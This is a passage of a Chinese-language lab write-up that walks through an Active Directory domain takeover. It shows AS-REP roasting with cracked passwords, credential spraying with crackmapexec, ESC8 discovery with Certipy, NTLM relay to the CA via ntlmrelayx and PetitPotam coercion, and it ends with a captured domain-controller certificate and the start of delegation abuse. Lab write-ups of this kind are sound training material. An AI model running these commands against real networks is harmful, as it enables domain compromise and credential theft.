+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+$krb5asrep$23$<a href="mailto:huachunmei@XIAORANG.LAB">huachunmei@XIAORANG.LAB</a>:af7b8497e5d913f0d6cdb3923e071b6c$43e84ee89cf7aa8bc13c5e51fce820c18bfbcab3b5c7b57526dbfcf3d602694af16e508629e9c673c8f2d9ebd316c7980636dc3f35df8500e32ff5ef826100bcc5ff319f185e3f8773770a1ded61385ecb65d8d71785bc2597e63eddf1622c1fddb5d589f6514fc27b47840bd915c782076b2661223ad7385282c146fbe6008bb5a11e29eb17c5772e5dcaa5939faba907263b3b722418675785870194f33e56390ea618e099f76ef6971a1b80330fceaaa2db1197b6ff9ef2e85c007d9c284fdc6cadc22815a5b403b6696f1b34948245c46fdff9b7f38da19a0e16fdbe26c056778df659dc4970bb749a8f<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] User lihongxia doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] User wangyulan doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+[-] User chenjianhua doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+</code></p></pre><p></p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# hashcat -m 18200 asrep.txt --show
+$krb5asrep$23$lixiuying@XIAORANG.LAB:3fdb7b45e6e8ed7d47ca3bfbd05b67c2$0634adfd2363496fd906b6d34465aa1ed42e5498a1f49ebd3fcb00b5ba91c778fc58bfa45913cf3f32372c7db8a8a153635da260f596d515b10f93b9423fd7467b30efac7a0133ea16614d2a73bcb70644685cf1d26f1f24ee647219a61b9a671dbf38bbebc732d2ed9c5f48229410604f6af712fb491d5030d129b90d656c44aa781ba18fc2cfbff2a99c7e587fa7032c9c20f564c4f2ae35024b205c1f04321a1dc55ad204cc13dda4cb557329c9fee011b2036b35045100ba2deec9e1efbd4e4da2d4bf646d4e59724d334677922b2d71ad789943f58cec86e15a2e03379fd5444aa7c69f00ba9a148643:winniethepooh
+$krb5asrep$23$huachunmei@XIAORANG.LAB:af7b8497e5d913f0d6cdb3923e071b6c$43e84ee89cf7aa8bc13c5e51fce820c18bfbcab3b5c7b57526dbfcf3d602694af16e508629e9c673c8f2d9ebd316c7980636dc3f35df8500e32ff5ef826100bcc5ff319f185e3f8773770a1ded61385ecb65d8d71785bc2597e63eddf1622c1fddb5d589f6514fc27b47840bd915c782076b2661223ad7385282c146fbe6008bb5a11e29eb17c5772e5dcaa5939faba907263b3b722418675785870194f33e56390ea618e099f76ef6971a1b80330fceaaa2db1197b6ff9ef2e85c007d9c284fdc6cadc22815a5b403b6696f1b34948245c46fdff9b7f38da19a0e16fdbe26c056778df659dc4970bb749a8f:1qaz2wsx
+</code></pre>
+<p>破解即可，两组凭据</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc -q crackmapexec smb 172.22.15.35/24 -u lixiuying -p winniethepooh
+SMB         172.22.15.24    445    XR-WIN08         [*] Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (name:XR-WIN08) (domain:XR-WIN08) (signing:False) (SMBv1:True)
+SMB         172.22.15.13    445    XR-DC01          [*] Windows Server 2016 Standard 14393 x64 (name:XR-DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
+SMB         172.22.15.18    445    XR-CA            [*] Windows Server 2016 Standard 14393 x64 (name:XR-CA) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
+SMB         172.22.15.35    445    XR-0687          [*] Windows Server 2022 Build 20348 x64 (name:XR-0687) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
+SMB         172.22.15.24    445    XR-WIN08         [-] XR-WIN08\lixiuying:winniethepooh STATUS_LOGON_FAILURE
+SMB         172.22.15.13    445    XR-DC01          [+] xiaorang.lab\lixiuying:winniethepooh
+SMB         172.22.15.18    445    XR-CA            [+] xiaorang.lab\lixiuying:winniethepooh
+SMB         172.22.15.35    445    XR-0687          [+] xiaorang.lab\lixiuying:winniethepooh
+</code><p><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]<br>
+└─# pc -q crackmapexec smb 172.22.15.35/24 -u huachunmei -p 1qaz2wsx<br>
+SMB         172.22.15.13    445    XR-DC01          [<em>] Windows Server 2016 Standard 14393 x64 (name:XR-DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>
+SMB         172.22.15.18    445    XR-CA            [</em>] Windows Server 2016 Standard 14393 x64 (name:XR-CA) (domain:xiaorang.lab) (signing:False) (SMBv1:True)<br>
+SMB         172.22.15.24    445    XR-WIN08         [<em>] Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (name:XR-WIN08) (domain:XR-WIN08) (signing:False) (SMBv1:True)<br>
+SMB         172.22.15.35    445    XR-0687          [</em>] Windows Server 2022 Build 20348 x64 (name:XR-0687) (domain:xiaorang.lab) (signing:False) (SMBv1:False)<br>
+SMB         172.22.15.13    445    XR-DC01          [+] xiaorang.lab\huachunmei:1qaz2wsx<br>
+SMB         172.22.15.18    445    XR-CA            [+] xiaorang.lab\huachunmei:1qaz2wsx<br>
+SMB         172.22.15.24    445    XR-WIN08         [-] XR-WIN08\huachunmei:1qaz2wsx STATUS_LOGON_FAILURE<br>
+SMB         172.22.15.35    445    XR-0687          [+] xiaorang.lab\huachunmei:1qaz2wsx<br>
+</code></p></pre><p></p>
+<p>两组都有效，接下来就能打CA了</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# echo "172.22.15.13 xiaorang.lab XR-DC01.xiaorang.lab" &gt;&gt; /etc/hosts
+echo "172.22.15.18 XR-CA.xiaorang.lab" &gt;&gt; /etc/hosts
+<p>┌──(root㉿MJ)-[/tmp/test/yunjing]<br>
+└─# pc -q certipy-ad find -u '<a href="mailto:huachunmei@xiaorang.lab">huachunmei@xiaorang.lab</a>' -p 1qaz2wsx -dc-ip 172.22.15.13 -ns 172.22.15.13 -vulnerable -stdout<br>
+Certipy v5.1.0 - by Oliver Lyak (ly4k)</p>
+</code><p><code class="notranslate">[<em>] Finding certificate templates<br>
+[</em>] Found 34 certificate templates<br>
+[<em>] Finding certificate authorities<br>
+[</em>] Found 1 certificate authority<br>
+[<em>] Found 12 enabled certificate templates<br>
+[</em>] Finding issuance policies<br>
+[<em>] Found 14 issuance policies<br>
+[</em>] Found 0 OIDs linked to templates<br>
+[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.22.15.13@53 answered The DNS operation timed out.; Server Do53:172.22.15.13@53 answered The DNS operation timed out.; Server Do53:172.22.15.13@53 answered The DNS operation timed out.<br>
+[!] Use -debug to print a stacktrace<br>
+[<em>] Retrieving CA configuration for 'xiaorang-XR-CA-CA' via RRP<br>
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...<br>
+[</em>] Successfully retrieved CA configuration for 'xiaorang-XR-CA-CA'<br>
+[<em>] Checking web enrollment for CA 'xiaorang-XR-CA-CA' @ 'XR-CA.xiaorang.lab'<br>
+[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1033)<br>
+[!] Use -debug to print a stacktrace<br>
+[</em>] Enumeration output:<br>
+Certificate Authorities<br>
+0<br>
+CA Name                             : xiaorang-XR-CA-CA<br>
+DNS Name                            : XR-CA.xiaorang.lab<br>
+Certificate Subject                 : CN=xiaorang-XR-CA-CA, DC=xiaorang, DC=lab<br>
+Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A<br>
+Certificate Validity Start          : 2023-06-03 07:19:59+00:00<br>
+Certificate Validity End            : 2028-06-03 07:29:58+00:00<br>
+Web Enrollment<br>
+HTTP<br>
+Enabled                         : True<br>
+HTTPS<br>
+Enabled                         : False<br>
+User Specified SAN                  : Disabled<br>
+Request Disposition                 : Issue<br>
+Enforce Encryption for Requests     : Enabled<br>
+Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy<br>
+Permissions<br>
+Owner                             : XIAORANG.LAB\Administrators<br>
+Access Rights<br>
+ManageCa                        : XIAORANG.LAB\Administrators<br>
+XIAORANG.LAB\Domain Admins<br>
+XIAORANG.LAB\Enterprise Admins<br>
+ManageCertificates              : XIAORANG.LAB\Administrators<br>
+XIAORANG.LAB\Domain Admins<br>
+XIAORANG.LAB\Enterprise Admins<br>
+Enroll                          : XIAORANG.LAB\Authenticated Users<br>
+[!] Vulnerabilities<br>
+ESC8                              : Web Enrollment is enabled over HTTP.<br>
+Certificate Templates                   : [!] Could not find any certificate templates<br>
+</code></p></pre><p></p>
+<p>有ECS8漏洞</p>
+<p> <strong>确认 Web 注册端点可访问</strong></p>
+<pre class="notranslate"><code class="notranslate">pc -q curl -v http://172.22.15.18/certsrv/
+</code></pre>
+<p>看到 <code class="notranslate">401 Unauthorized</code> 和 <code class="notranslate">WWW-Authenticate: Negotiate</code> 就说明支持 NTLM</p>
+<p><strong>启动 NTLM 中继</strong></p>
+<pre class="notranslate"><code class="notranslate">ntlmrelayx.py -t http://172.22.15.18/certsrv/certfnsh.asp -smb2support --adcs --template DomainController -l /root/loot --no-http-server
+</code><p><code class="notranslate"></code></p></pre><p></p>
+<p><strong>强制认证</strong></p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[~/tools/Windows/PetitPotam]
+└─# pc -q python3 PetitPotam.py \
+  -u huachunmei -p 1qaz2wsx -d xiaorang.lab \
+  172.22.15.26 172.22.15.13
+/root/tools/Windows/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+<pre class="notranslate"><code class="notranslate">          ___            _        _      _        ___            _
+         | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+         |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
+        _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
+      _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
+      "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
+
+          PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                  by topotam (@topotam77)
+
+                 Inspired by @tifkin_ &amp;#x26; @elad_shamir previous work on MS-RPRN
+</code></pre>
+</code><p><code class="notranslate">Trying pipe lsarpc<br>
+[-] Connecting to ncacn_np:172.22.15.13[\PIPE\lsarpc]<br>
+[+] Connected!<br>
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e<br>
+[+] Successfully bound!<br>
+[-] Sending EfsRpcOpenFileRaw!<br>
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!<br>
+[+] OK! Using unpatched function!<br>
+[-] Sending EfsRpcEncryptFileSrv!<br>
+</code></p></pre><p></p>
+<p>拿到域控机器账户的证书</p>
+<pre class="notranslate"><code class="notranslate">
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+<p>[<em>] Protocol Client LDAPS loaded..<br>
+[</em>] Protocol Client LDAP loaded..<br>
+[<em>] Protocol Client SMB loaded..<br>
+[</em>] Protocol Client RPC loaded..<br>
+[<em>] Protocol Client DCSYNC loaded..<br>
+[</em>] Protocol Client IMAP loaded..<br>
+[<em>] Protocol Client IMAPS loaded..<br>
+[</em>] Protocol Client HTTP loaded..<br>
+[<em>] Protocol Client HTTPS loaded..<br>
+[</em>] Protocol Client SMTP loaded..<br>
+[<em>] Protocol Client MSSQL loaded..<br>
+[</em>] Running in relay mode to single host<br>
+[<em>] Setting up SMB Server<br>
+[</em>] Setting up WCF Server</p>
+</code><p><code class="notranslate">[<em>] Servers started, waiting for connections<br>
+[</em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[<em>] HTTP server returned error code 200, treating as a successful login<br>
+[</em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[<em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[</em>] HTTP server returned error code 200, treating as a successful login<br>
+[<em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[</em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[<em>] HTTP server returned error code 200, treating as a successful login<br>
+[</em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[<em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[</em>] HTTP server returned error code 200, treating as a successful login<br>
+[<em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[</em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[<em>] HTTP server returned error code 200, treating as a successful login<br>
+[</em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[<em>] Generating CSR...<br>
+[</em>] CSR generated!<br>
+[<em>] Getting certificate...<br>
+[</em>] Skipping user XR-DC01$ since attack was already performed<br>
+[<em>] Skipping user XR-DC01$ since attack was already performed<br>
+[</em>] Skipping user XR-DC01$ since attack was already performed<br>
+[<em>] Skipping user XR-DC01$ since attack was already performed<br>
+[</em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[<em>] HTTP server returned error code 200, treating as a successful login<br>
+[</em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[<em>] Skipping user XR-DC01$ since attack was already performed<br>
+[</em>] SMBD-Thread-22: Connection from XIAORANG/XR-DC01$@172.22.15.13 controlled, attacking target <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a><br>
+[<em>] HTTP server returned error code 200, treating as a successful login<br>
+[</em>] Authenticating against <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> as XIAORANG/XR-DC01$ SUCCEED<br>
+[<em>] Skipping user XR-DC01$ since attack was already performed<br>
+[</em>] GOT CERTIFICATE!<br>
+[*] Base64 certificate of user XR-DC01$:<br>
+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<br>
+</code></p></pre><p></p>
+<p>base64解码道cert.pfx里，DCsync的时候报错<code class="notranslate">KDC_ERR_PADATA_TYPE_NOSUPP</code></p>
+<p> 这个错误意味着<strong>域控（DC）不支持 PKINIT 认证</strong>，导致证书无法直接用于请求 Kerberos TGT。走ldap就行</p>
+<p>机器账户不能建用户，不然直接建个域管，只能委派了，建一个机器账户，把域控 <code class="notranslate">XR-DC01$</code> 的委派权限授予这个机器账户打资源委派</p>
+<pre class="notranslate"><code class="notranslate"># add_computer mj
+Attempting to add a new computer with the name: mj$
+Inferred Domain DN: DC=xiaorang,DC=lab
+Inferred Domain Name: xiaorang.lab
+New Computer DN: CN=mj,CN=Computers,DC=xiaorang,DC=lab
